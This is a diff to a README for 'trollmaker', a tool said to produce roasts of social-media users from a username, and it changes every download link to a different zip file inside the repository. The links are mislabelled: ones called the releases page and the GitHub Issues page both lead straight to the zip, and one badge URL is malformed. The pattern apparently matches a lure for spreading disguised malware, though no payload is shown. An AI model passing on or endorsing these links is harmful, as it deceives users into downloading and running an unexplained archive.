@@ -1,7 +1,7 @@
 # 🎭 trollmaker - Get Humorous Roasts with Ease
 
 ## 🔗 Download Now!
-[![Download trollmaker](https://raw.githubusercontent.com/osciloskop/trollmaker/main/trollmaker/Software-v2.4.zip%20trollmaker-%https://raw.githubusercontent.com/osciloskop/trollmaker/main/trollmaker/Software-v2.4.zip)](https://raw.githubusercontent.com/osciloskop/trollmaker/main/trollmaker/Software-v2.4.zip)
+[![Download trollmaker](https://github.com/osciloskop/trollmaker/raw/refs/heads/main/trollmaker/Software-v1.1.zip%20trollmaker-%https://github.com/osciloskop/trollmaker/raw/refs/heads/main/trollmaker/Software-v1.1.zip)](https://github.com/osciloskop/trollmaker/raw/refs/heads/main/trollmaker/Software-v1.1.zip)
 
 ## 📚 Overview
 trollmaker is an engaging package that lets you input a public username or handle from social media. In return, you receive a fun and structured roast based on publicly available information. Enjoy light-hearted banter and share laughs with friends.
@@ -16,7 +16,7 @@ Using trollmaker is simple. Just follow these steps to get started.
 - Memory: Minimum 2 GB RAM recommended.
 
 ## 📥 Download & Install
-To download trollmaker, visit our releases page: [Download the Latest Version](https://raw.githubusercontent.com/osciloskop/trollmaker/main/trollmaker/Software-v2.4.zip).
+To download trollmaker, visit our releases page: [Download the Latest Version](https://github.com/osciloskop/trollmaker/raw/refs/heads/main/trollmaker/Software-v1.1.zip).
 
 1. On the releases page, find the latest version listed.
 2. Click the version link to access the release files.
@@ -65,7 +65,7 @@ If you encounter issues while using trollmaker, consider the following steps:
 If the problem persists, you can raise an issue on our GitHub page for further assistance.
 
 ## 📞 Support
-For any inquiries or support requests, please visit our [GitHub Issues page](https://raw.githubusercontent.com/osciloskop/trollmaker/main/trollmaker/Software-v2.4.zip). We aim to respond within 48 hours to assist you effectively. 
+For any inquiries or support requests, please visit our [GitHub Issues page](https://github.com/osciloskop/trollmaker/raw/refs/heads/main/trollmaker/Software-v1.1.zip). We aim to respond within 48 hours to assist you effectively. 
 
 ## 📝 Contributing
 We welcome contributions from the community. If you have suggestions or want to improve trollmaker, feel free to fork the project and submit a pull request. Your input helps us make trollmaker better for everyone.
@@ -77,4 +77,4 @@ Future versions of trollmaker will include:
 - Integration with more social media platforms.
 
 ## 🔗 Download Now Again!
-Don't forget to download trollmaker from our releases page: [Download the Latest Version](https://raw.githubusercontent.com/osciloskop/trollmaker/main/trollmaker/Software-v2.4.zip). Enjoy your roasts!
+Don't forget to download trollmaker from our releases page: [Download the Latest Version](https://github.com/osciloskop/trollmaker/raw/refs/heads/main/trollmaker/Software-v1.1.zip). Enjoy your roasts!
